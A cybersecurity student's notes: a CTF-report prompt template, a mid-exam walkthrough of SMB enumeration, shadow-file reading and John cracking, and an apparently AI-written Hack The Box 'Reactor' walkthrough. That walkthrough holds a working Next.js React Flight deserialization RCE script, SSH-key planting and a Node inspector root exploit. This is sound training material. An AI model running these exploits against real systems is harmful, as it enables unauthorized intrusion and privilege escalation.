## Cyber Journey

🛡️ DAY 50 of my #CYBERSECURITY Journey!
Pawned the Dancing machine on Hack The Box.


AD4MPU3MAN

----
## Cloud Journey

☁️ DAY 4 of my #CLOUD Journey!
Completed the Compute section of the @Oracle OCI Foundations course:
Topics:  
- Instances & scaling
- Cloud Shell demo
- Creating compute instances
- OKE & container workloads
- Serverless with Oracle Functions
#CloudComputing


---
## Lab Prompt

I am documenting the **__** CTF challenge and need help converting my raw notes into a professional technical report.

**Your Instructions:**

1. **Professional Narrative:** Rewrite my progress into a clear, technical narrative. Avoid repetitive sentence starters (e.g., don't start every sentence with "Next, I..."). Use active, varied transitions like "Initial reconnaissance revealed...", "To further investigate the surface area...", or "Leveraging the identified vulnerability...".

2. **Mandatory Command Breakdown:** Every time a command is mentioned, you **must** document it using this specific format:
    - **Command:** `The Full Command`
    - **Breakdown:** 
	    - `Flag/Component` 
		    - **Description:** What it is
		    - **Purpose:** Why it was used in this specific CTF context.
		- `Flag/Component` 
		    - **Description:** What it is
		    - **Purpose:** Why it was used in this specific CTF context.

3. **Next Steps:** Conclude each entry by suggesting 3 logical next steps or common bypasses to move forward.

**My Input Format:** I will provide: What I found, The command I ran, and The result.

**Do you understand these formatting requirements? If so, let's start with my first step.**

---
## Cyber Shujaa CTF Schedule

|               | LAB             |
| ------------- | --------------- |
|               |                 |
|               |                 |
|               |                 |
| 01ST APR 2026 | THM Lunizz CTF  |
| 25TH MAR 2026 | HTB VARIATYPE   |
| 18TH MAR 2026 | THM LOOKUP      |
| 11TH MAR 2026 | HTB CCTV        |
| 04TH MAR 2026 | HTB WINGDATA    |
| 25TH FEB 2026 | HTB FACTS       |
| 18TH FEB 2026 | THM UNBAKED PIE |
| 11TH FEB 2026 |                 |
| 04TH FEB 2026 | THM RELEVANT    |
| 28TH JAN 2026 | THM THOMPSON    |
| 21TH JAN 2026 | HTB TWOMILLION  |
| 14TH JAN 2026 | THM SMOL        |
|               |                 |
|               |                 |

---
## SAC12026 Mid-Exam

1. Conduct an Nmap scan on the provided Linux machine. Identify the open ports. (2 mks)

```shell
┌──(kali㉿kali)-[~]
└─$ nmap 4.180.20.166    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 04:24 -0500
Nmap scan report for 4.180.20.166
Host is up (0.027s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 10.08 seconds
```

2. Identify the service running on the second port from your nmap scan. What is the version of that service? (2mks)

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 80 4.180.20.166          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 04:25 -0500
Nmap scan report for 4.180.20.166
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
```

3. There is a hidden flag in the webpage. Submit the contents of the flag (2 mks)

```shell

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Cyber Resilience CTF — Exam Portal</title>
  <style>
    body { font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:#0b1220; color:#e6eef8; margin:0; padding:3rem; }
    .card { background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border:1px solid rgba(255,255,255,0.04); padding:2rem; border-radius:12px; max-width:900px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.6); }
    h1 { margin-top:0; color:#a8d1ff;}
    .hint { margin-top:1rem; color:#cbe6ff; font-size:0.95rem; }
    footer { margin-top:2rem; font-size:0.8rem; color:#94b6df }
    .banner { font-weight:600; color:#ffd47a; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Welcome to the Cyber Resilience Exam Portal</h1>
    <p class="banner">Your task: enumerate services, extract flags, and document findings.</p>
    <p>Start by scanning the host, checking open services, and inspecting any accessible shares. This portal is intentionally configured with multiple hints.</p>
    <div class="hint">
      Hint B: Console-savvy students should remember to check the browser console for additional leads.
    </div>

    <hr/>

    <h3>Rules</h3>
    <ol>
      <li>Work only inside the designated directories and shares.</li>
      <li>Do NOT attempt to break out of the environment.</li>
      <li>Report any bugs to the exam admins.</li>
    </ol>

    <footer>Exam environment — do not share flags outside this exercise.</footer>
  </div>

  <!-- hidden flag: shujaa{v13w_s0urc3_m4st3r} -->

  <script>
    // Bonus flag for console hunters
    console.log("shujaa{c0ns0l3_d3t3ct1v3}");
  </script>
</body>
</html>
```

4. Perform banner grabbing using netcat on port 1337. Submit the contents of the flag. (2marks)

```shell
┌──(kali㉿kali)-[~]
└─$ nc -vn 4.180.20.166 1337
(UNKNOWN) [4.180.20.166] 1337 (?) open
CTFService v1.2 - Welcome to the exam.\nFLAG: shujaa{n3tc4t_l1st3n3r_fl4g}\n^C
```

5. The same service is running on more than one port of the system. What is the version of the service? (2 mk)

```shell
└─$ nmap -sV 4.180.20.166                 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 04:53 -0500
Nmap scan report for 4.180.20.166
Host is up (0.025s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        nginx 1.24.0 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.44 seconds
```

6. Using smbclient tool, identify the available network shares (2 mks)

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient -L 4.180.20.166 -N         

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        CTFShare        Disk      CTF
        IPC$            IPC       IPC Service (CTF Samba Server)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 4.180.20.166 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

7. How many hidden shares are among the identified shares above? Name them. (2 mks)
	2

8. What is the name of the share that is accessible? (2 mk)
	CTFShare

9. Access the share using null authentication, what is the folder's name discovered within the share? (2 marks)

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient //4.180.20.166/CTFShare -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 26 04:40:59 2026
  ..                                  D        0  Thu Feb 26 04:40:59 2026
  confidential.zip                    N      383  Thu Feb 26 04:40:59 2026

                29379712 blocks of size 1024. 26685792 blocks available
smb: \> 
```

10. Download and unpack the files inside the folder and read the contents. Submit the contents of the flag (2 mks)

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient //4.180.20.166/CTFShare -N
Try "help" to get a list of possible commands.
smb: \> get confidential.zip
getting file \confidential.zip of size 383 as confidential.zip (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ unzip confidential.zip 
Archive:  confidential.zip
 extracting: flag.txt                
 extracting: creds.txt               

┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ ls
confidential.zip  creds.txt  flag.txt

┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ cat flag.txt
shujaa{smb_sh4r3_3numer4t3d}
```

11. What is the exposed username and password? (1 mk)

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ cat creds.txt
username: examuser
password: Cyb3rShuj44!
```

12. SSH into the machine and retrieve the flag in the user’s home directory. (2 mks)

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ ssh examuser@4.180.20.166
examuser@4.180.20.166's password: 
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.17.0-1008-azure x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Mar  7 10:41:02 UTC 2026

  System load:  0.13              Processes:             134
  Usage of /:   9.1% of 28.02GB   Users logged in:       0
  Memory usage: 4%                IPv4 address for eth0: 172.16.0.4
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

16 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Sat Mar  7 10:41:03 2026 from 102.216.86.189
examuser@midexam:~$ ls
checkflag  checkifcompressed  flag.txt  grepme.txt
examuser@midexam:~$ cat flag.txt 
shujaa{w3lc0m3_t0_ssh_acc3ss}
```

13. In the user's home directory what is the name of the first hidden file owned by root. (1 mk)

```shell
/home/examuser
examuser@midexam:~$ ls -la
total 56
drwxr-x--- 2 examuser examuser  4096 Mar  7 10:44 .
drwxr-xr-x 5 root     root      4096 Feb 26 09:40 ..
-r--r--r-- 1 root     root        33 Feb 26 09:41 .encoded
---x--x--x 1 root     root     16328 Feb 26 09:41 checkflag
---x--x--x 1 root     root     16216 Feb 26 09:41 checkifcompressed
-r--r--r-- 1 root     root        30 Feb 26 09:41 flag.txt
-r--r--r-- 1 root     root      6700 Feb 26 09:41 grepme.txt
```

14. Retrieve the flag by decoding the contents of the file you found above. **NB only use the terminal to solve this task** (2mks)

```shell
examuser@midexam:~$ cat .encoded
c2h1amFhezY0X2QzYzBkM2RfZmw0Z30=
examuser@midexam:~$ cat .encoded | base64 -d
shujaa{64_d3c0d3d_fl4g}examuser@midexam:~$ 
```

15. Using grep, retrieve a flag hidden in the grepme.txt within the user's home directory (2 mks)

```shell
examuser@midexam:~$ grep "shujaa" grepme.txt 
shujaa{gr3p_m4st3r_f0und_m3}
```

16. Create a file with the content cybershujaa_exam, save the file, run the binary (checkflag) against your file and retrieve the flag. (3 mks)

```shell
examuser@midexam:~$ vi file.txt
examuser@midexam:~$ cat file.txt 
cybershujaa_exam
examuser@midexam:~$ ./checkflag file.txt 
RESULT: shujaa{ch3ck_f1l3_c0nt3nt_succ3ss}\nexamuser@midexam:~$ 
```

17. Create a NEW file called "compressed.txt" with the content "zipmaster2024", compress it then run the binary in the user's home directory called "checkifcompressed" giving the name of your zip file as an argument. What is the flag? (3 mks)

```shell
examuser@midexam:~$ echo "zipmaster2024" > compressed.txt ; zip compressed.zip compressed.txt ; ./checkifcompressed compressed.zip
  adding: compressed.txt (stored 0%)
RESULT: shujaa{z1p_m4st3r_c0mpl3t3d}\nexamuser@midexam:~$ 
```

18. A misconfiguration is on the shadow file allowing users to read its contents. Retrieve both the password file passwd and the shadow file. (2 mks)

```shell
examuser@midexam:~$ cat /etc/shadow
root:*:20483:0:99999:7:::
daemon:*:20483:0:99999:7:::
bin:*:20483:0:99999:7:::
sys:*:20483:0:99999:7:::
sync:*:20483:0:99999:7:::
games:*:20483:0:99999:7:::
man:*:20483:0:99999:7:::
lp:*:20483:0:99999:7:::
mail:*:20483:0:99999:7:::
news:*:20483:0:99999:7:::
uucp:*:20483:0:99999:7:::
proxy:*:20483:0:99999:7:::
www-data:*:20483:0:99999:7:::
backup:*:20483:0:99999:7:::
list:*:20483:0:99999:7:::
irc:*:20483:0:99999:7:::
_apt:*:20483:0:99999:7:::
nobody:*:20483:0:99999:7:::
systemd-network:!*:20483::::::
systemd-timesync:!*:20483::::::
dhcpcd:!:20483::::::
messagebus:!:20483::::::
syslog:!:20483::::::
systemd-resolve:!*:20483::::::
uuidd:!:20483::::::
tss:!:20483::::::
sshd:!:20483::::::
pollinate:!:20483::::::
tcpdump:!:20483::::::
landscape:!:20483::::::
fwupd-refresh:!*:20483::::::
polkitd:!*:20483::::::
_chrony:!:20483::::::
azureuser:!:20510:0:99999:7:::
examuser:$y$j9T$ojp.We/iGt3o871xOUMVH/$gUDhgM5LwENmKQI1gjvGFRW0FU2Rp9tP1gC2Q0.pAU/:20510:0:99999:7:::
examadmin:$y$j9T$TN4OaS/VTu1SaKDNlcwPA1$47G8q5/TJG0HOnXiCvRPuMyG/kki58ctxZs2Pbjnfc2:20510:0:99999:7:::
```

```shell
examuser@midexam:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
syslog:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin
tss:x:104:104:TPM software stack,,,:/var/lib/tpm:/bin/false
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:106:1::/var/cache/pollinate:/bin/false
tcpdump:x:107:108::/nonexistent:/usr/sbin/nologin
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:990:990:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
polkitd:x:989:989:User for polkitd:/:/usr/sbin/nologin
_chrony:x:109:113:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
azureuser:x:1000:1000:Ubuntu:/home/azureuser:/bin/bash
examuser:x:1001:1001::/home/examuser:/bin/bash
examadmin:x:1002:1002::/home/examadmin:/bin/bash
examuser@midexam:~$ 
```

19. Unshadow and crack using John. What is the examadmin password? Use the provided wordlist. (2 mks) HINT: use the format –format=crypt

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ unshadow passwd shadow > crackme.txt ; john --format=crypt --wordlist=Wordlist.txt crackme.txt
Warning: hash encoding string length 18, type id #0
appears to be unsupported on this system; will not load such hashes.
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
shujaa2024       (examadmin)     
1g 0:00:00:25 DONE (2026-03-07 07:36) 0.03849g/s 155.6p/s 159.3c/s 159.3C/s multi..like
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

20. Retrieve the  flag.txt from the examadmin user’s home directory. (2 mks)

```shell
examuser@midexam:~$ su examadmin
Password: 
examadmin@midexam:/home/examuser$ ls
ls: cannot open directory '.': Permission denied
examadmin@midexam:/home/examuser$ cd 
examadmin@midexam:~$ ls
flag.txt
examadmin@midexam:~$ cat flag.txt
shujaa{r00t_pr1v_3sc4l4t10n_m4st3r}
examadmin@midexam:~$ 
```

---
## Random

1. [x] Facts
2. [ ] Pterodactyl
3. [x] WingData
4. [ ] Interpreter
5. [ ] Pirate
6. [ ] CCTV
7. [ ] VariaType
8. [ ] Kobold






# HTB Machine: Reactor — Full Penetration Test Walkthrough

**Machine:** Reactor  
**IP:** 10.129.13.245  
**Platform:** Hack The Box  
**OS:** Ubuntu Linux (6.8.0-117-generic)  
**Difficulty:** Medium  
**Date:** 2026-06-01  
**Author:** HTB Pentester (Claude Code)

---

## Flags

| Flag | Value |
|------|-------|
| User (`/home/engineer/user.txt`) | `e77a25392251881af2255213ee206176` |
| Root (`/root/root.txt`) | `fab4252120bf323ccadc3b9be935bfa0` |

---

## Executive Summary

The Reactor machine hosts a Next.js industrial monitoring dashboard (ReactorWatch Core Monitoring System v3.2.1) on port 3000. The foothold was obtained by exploiting a **React Server Components (RSC) / React Flight deserialization vulnerability** in Next.js that allows arbitrary JavaScript execution via prototype pollution of the internal `_response` handler. This provides unauthenticated remote code execution as the `node` service user.

Lateral movement to the `engineer` user was accomplished by extracting an MD5 password hash from an SQLite database embedded in the application directory, cracking it offline (password: `reactor1`), and setting up SSH key authentication.

Privilege escalation to root leveraged a **Node.js remote debugger** (`--inspect=127.0.0.1:9229`) running as root without proper security controls. By connecting to the Chrome DevTools Protocol (CDP) WebSocket endpoint via SSH port forwarding, arbitrary JavaScript was executed in the context of the root Node.js process.

---

## Phase 1: Enumeration

### Port Scan — Initial

```
nmap -sC -sV -oN Reactor/nmap_initial.txt 10.129.13.245
```

**Results:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
3000/tcp open  http    Next.js (X-Powered-By: Next.js)
```

Only two ports open:
- **22/tcp** — SSH (OpenSSH 9.6p1, Ubuntu) — low CVE exposure, unlikely attack vector
- **3000/tcp** — HTTP — Next.js application, primary attack surface

### Port Scan — Full Range

```
nmap -p- --min-rate 5000 -oN Reactor/nmap_allports.txt 10.129.13.245
```

Confirmed only ports 22 and 3000 are open. No additional services.

### Web Application Enumeration (Port 3000)

Identified the application as **ReactorWatch Core Monitoring System v3.2.1**, a nuclear reactor monitoring dashboard.

**Key headers:**
```
X-Powered-By: Next.js
x-nextjs-cache: HIT
x-nextjs-prerender: 1
```

**Build ID extraction from RSC payload:**
The Next.js build ID `L3bimJe_3LvBcFWAnK5L4` was extracted from the React Flight inline payload:
```
"b":"L3bimJe_3LvBcFWAnK5L4"
```

**Build manifest check:**
```
GET /_next/static/L3bimJe_3LvBcFWAnK5L4/_buildManifest.js
```

The build manifest reveals App Router with limited exposed routes. The application appears to be a static dashboard with no visible user input forms.

**Application characteristics:**
- No authentication
- No user-visible input forms
- Serves static monitoring data (reactor power, temperature, pressure, etc.)
- Title: "ReactorWatch | Core Monitoring System"
- Uses Next.js App Router (not Pages Router)

**Critical observation:** Despite the static-looking UI, Next.js App Router applications can have hidden **Server Actions** — server-side functions callable via `POST` requests with a `Next-Action` header.

---

## Phase 2: Vulnerability Analysis

### CVE: React Flight / Next.js Server Action Deserialization RCE

**Type:** Server-Side Deserialization → Prototype Pollution → Arbitrary Code Execution  
**Impact:** Unauthenticated Remote Code Execution  
**Component:** Next.js React Flight (`react-server-dom-webpack`) — Server Action handler

**Technical explanation:**

Next.js Server Actions use the React Flight protocol to serialize/deserialize data between client and server. When a POST request is sent with a `Next-Action` header, the server deserializes a multipart form body as a React Flight encoded payload.

The vulnerability exploits prototype pollution in the React Flight decoder. By crafting a malicious payload where:

1. A fake "thenable" object is injected with `"then": "$1:__proto__:then"` — polluting `Object.prototype.then` to point to a reference path that resolves to the `_formData.get` function
2. The `_response._formData.get` is set to `"$1:constructor:constructor"` — resolving to `Function.constructor` (the `Function` constructor itself)
3. The `_response._prefix` contains arbitrary JavaScript code injected as the function body

When the Flight decoder processes this payload, it:
1. Resolves `$1:__proto__:then` → ends up calling `Function.constructor` with `_prefix` as the argument
2. This constructs and executes the arbitrary JS code in `_prefix`
3. The crafted code calls `process.mainModule.require('child_process').execSync()` for OS command execution

**Exploit payload structure:**
```json
{
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": "{\"then\": \"$B0\"}",
    "_response": {
        "_prefix": "<ARBITRARY_JS_CODE>",
        "_formData": {"get": "$1:constructor:constructor"}
    }
}
```

**Output exfiltration:** The output is thrown as an `Error` with a custom `digest` field, which Next.js returns in the response body as `1:E{"digest":"<OUTPUT>"}`.

---

## Phase 3: Exploitation — Initial Access

### Step 1: Verify RCE

Testing the exploit with the `id` command:

```python
# exploit_rce.py / rce3.py
import requests, json, re, base64

BASE_URL = "http://10.129.13.245:3000/"
CMD = "id"

b64_cmd = base64.b64encode(CMD.encode()).decode()
js_prefix = f"""
var cmd = Buffer.from('{b64_cmd}', 'base64').toString();
var res = process.mainModule.require('child_process').execSync(cmd, {{timeout:5000}}).toString().trim();
throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});
"""

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": js_prefix.strip(),
        "_formData": {"get": "$1:constructor:constructor"},
    },
}

files = {"0": (None, json.dumps(crafted_chunk)), "1": (None, '"$@0"')}
headers = {"Next-Action": "x"}
response = requests.post(BASE_URL, files=files, headers=headers)
```

**Output:**
```
uid=999(node) gid=988(node) groups=988(node)
```

RCE confirmed as the `node` service user.

**Note on base64 encoding:** Single quotes in the original `execSync` string interfere with the JSON template literal. The improved approach uses `Buffer.from('<b64>', 'base64').toString()` to avoid quoting issues when executing complex shell commands.

### Step 2: System Enumeration via RCE

```bash
python3 rce3.py "uname -a"
# Linux reactor 6.8.0-117-generic #117-Ubuntu SMP PREEMPT_DYNAMIC Tue May  5 19:26:24 UTC 2026

python3 rce3.py "cat /etc/passwd"
# Shows: engineer:x:1000:1000:engineer:/home/engineer:/bin/bash
#        node:x:999:988::/home/node:/usr/sbin/nologin

python3 rce3.py "ls /opt/reactor-app/"
# app  next.config.js  node_modules  package.json  package-lock.json  reactor.db
```

**Key finding:** `reactor.db` — a SQLite database in the application directory.

### Step 3: Database Credential Extraction

```bash
python3 rce3.py "python3 -c \"import sqlite3; conn = sqlite3.connect('/opt/reactor-app/reactor.db'); cursor = conn.cursor(); cursor.execute('SELECT username, password_hash FROM users'); print(cursor.fetchall())\""
```

**Output:**
```
[('admin', 'a203b22191d744a4e70ada5c101b17b8'), ('engineer', '39d97110eafe2a9a68639812cd271e8e')]
```

**Database schema:**
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
);
```

---

## Phase 4: Lateral Movement — SSH as engineer

### Step 1: Hash Cracking

The hashes are MD5 format. Using John the Ripper with the rockyou wordlist:

```bash
echo "a203b22191d744a4e70ada5c101b17b8" > hashes.txt
echo "39d97110eafe2a9a68639812cd271e8e" >> hashes.txt

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=raw-md5 hashes.txt
```

**Result:**
```
?:reactor1
1 password hash cracked, 1 left
```

**Verification:**
```bash
echo -n "reactor1" | md5sum
# 39d97110eafe2a9a68639812cd271e8e
```

Password `reactor1` belongs to the `engineer` account.

### Step 2: SSH Key Setup via RCE

Since `sshpass` was not available locally, an SSH key pair was generated and placed in the engineer's `~/.ssh/authorized_keys` using the node RCE + `su` command:

```bash
# Generate key pair locally
ssh-keygen -t ed25519 -f ~/.ssh/htb_reactor -N ""

# Write a setup script to /tmp via RCE (world-writable)
python3 rce3.py "echo 'mkdir -p /home/engineer/.ssh; chmod 700 /home/engineer/.ssh; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...\" > /home/engineer/.ssh/authorized_keys; chmod 600 /home/engineer/.ssh/authorized_keys' > /tmp/setup_ssh.sh && chmod +x /tmp/setup_ssh.sh"

# Execute the script as engineer using su (node can su to engineer with the cracked password)
python3 rce3.py "python3 -c \"import subprocess; result = subprocess.run(['su', '-s', '/bin/bash', '-c', '/tmp/setup_ssh.sh', 'engineer'], input='reactor1\n', capture_output=True, text=True); print(result.stdout)\""
```

The `su` command works because:
1. The `node` user can execute `su`
2. The `engineer` password `reactor1` is valid on the system

### Step 3: SSH Login and User Flag

```bash
ssh -i ~/.ssh/htb_reactor -o StrictHostKeyChecking=no engineer@10.129.13.245 "whoami && id && cat /home/engineer/user.txt"
```

**Output:**
```
engineer
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
e77a25392251881af2255213ee206176
```

**USER FLAG: `e77a25392251881af2255213ee206176`**

---

## Phase 5: Privilege Escalation to Root

### Step 1: Process Enumeration

```bash
ssh engineer@10.129.13.245 "ps aux | grep node"
```

**Output:**
```
node     1379  ...  next-server (v15.0.3)
root     1387  0.0  1.1  1066476  46488  ?  Ssl  ...  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

**Critical finding:** PID 1387 — `node` process running as **root** with `--inspect=127.0.0.1:9229`

The `--inspect` flag enables the Chrome DevTools Protocol (CDP) debugger interface, listening on the loopback interface at port 9229. This allows any local user to connect and execute arbitrary JavaScript in the context of the root process.

### Step 2: Verify Debugger Access

```bash
ssh engineer@10.129.13.245 "curl -s http://127.0.0.1:9229/json"
```

**Output:**
```json
[{
  "description": "node.js instance",
  "id": "788b755a-53bd-4f07-8563-b7fd69202bde",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/788b755a-53bd-4f07-8563-b7fd69202bde"
}]
```

The uptime monitor script (`/opt/uptime-monitor/worker.js`) is a simple HTTP probe that monitors the Next.js app availability — a completely benign service inadvertently running with debug access enabled as root.

### Step 3: SSH Port Forwarding

Since the inspector binds to `127.0.0.1:9229` (loopback only), we set up an SSH local port forward to access it from our attack machine:

```bash
ssh -i ~/.ssh/htb_reactor -L 9229:127.0.0.1:9229 engineer@10.129.13.245 -N &
```

This maps `localhost:9229` on our machine to `127.0.0.1:9229` on the target.

### Step 4: CDP WebSocket Exploitation

Using Python's `websocket-client` library to interact with the Chrome DevTools Protocol:

```python
# privesc_local2.py
import json, websocket, urllib.request

# Get WebSocket URL
with urllib.request.urlopen('http://127.0.0.1:9229/json') as response:
    data = json.loads(response.read().decode())
    ws_url = data[0]['webSocketDebuggerUrl']

ws = websocket.create_connection(ws_url)

def send_and_wait(ws, msg_id, method, params=None):
    """Send CDP command, skip events, return response with matching ID."""
    ws.send(json.dumps({"id": msg_id, "method": method, "params": params or {}}))
    for _ in range(20):
        result = json.loads(ws.recv())
        if result.get('id') == msg_id:
            return result
    return None

msg_id = 1

# Enable Runtime execution context
send_and_wait(ws, msg_id, "Runtime.enable")
msg_id += 1

# Verify running as root
result = send_and_wait(ws, msg_id, "Runtime.evaluate", {
    "expression": "process.getuid()",
    "returnByValue": True
})
# Returns: {'result': {'type': 'number', 'value': 0}}  <- UID=0 (root)!
msg_id += 1

# Read root flag
result = send_and_wait(ws, msg_id, "Runtime.evaluate", {
    "expression": "process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()",
    "returnByValue": True
})
print(result['result']['result']['value'])
```

**Key technical notes:**
- The CDP WebSocket receives events (like `Runtime.executionContextCreated`) mixed with command responses
- Responses are matched by their `id` field; events have only a `method` field
- `Runtime.evaluate` with `returnByValue: true` returns primitive values directly without requiring `Runtime.getProperties`

**Output:**
```
[+] Running as ROOT (UID=0)!
[+] ROOT FLAG: fab4252120bf323ccadc3b9be935bfa0
```

**ROOT FLAG: `fab4252120bf323ccadc3b9be935bfa0`**

---

## Attack Chain Summary

```
Unauthenticated access to port 3000 (Next.js)
          |
          v
React Flight Server Action deserialization RCE
(prototype pollution -> Function.constructor -> execSync)
          |
          v
RCE as 'node' user (UID=999)
          |
          v
Extract SQLite DB: engineer:39d97110eafe2a9a68639812cd271e8e (MD5)
          |
          v
Crack hash: engineer / reactor1
          |
          v
Write SSH key via su+RCE -> SSH as engineer
          |
          v
USER FLAG: e77a25392251881af2255213ee206176
          |
          v
Discover: root running node --inspect=127.0.0.1:9229
          |
          v
SSH port forward 9229 -> CDP WebSocket exploit
          |
          v
Runtime.evaluate as root -> execSync('cat /root/root.txt')
          |
          v
ROOT FLAG: fab4252120bf323ccadc3b9be935bfa0
```

---

## Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| nmap | 7.98 | Port scanning and service enumeration |
| Python 3 | 3.x | Custom exploit scripts (rce3.py, privesc_local2.py) |
| websocket-client (Python) | — | CDP WebSocket interaction for Node.js debugger |
| john | 1.9.x | MD5 hash cracking |
| hashcat | — | Hash cracking (supplementary) |
| ssh | OpenSSH | SSH access and port forwarding |
| curl | — | HTTP enumeration and verification |
| gobuster | — | Directory brute-forcing (no significant findings) |

---

## Lessons Learned

1. **Next.js Server Actions are a hidden attack surface.** Even with no visible forms or input fields, the App Router can expose server-side deserialization endpoints accessible via `POST` + `Next-Action` header. Fuzzing for these is important on Next.js targets.

2. **React Flight deserialization is powerful.** The prototype pollution chain in the React Flight codec is a sophisticated exploit that bypasses traditional input sanitization because it exploits the serialization/deserialization process itself, not user-input parsing.

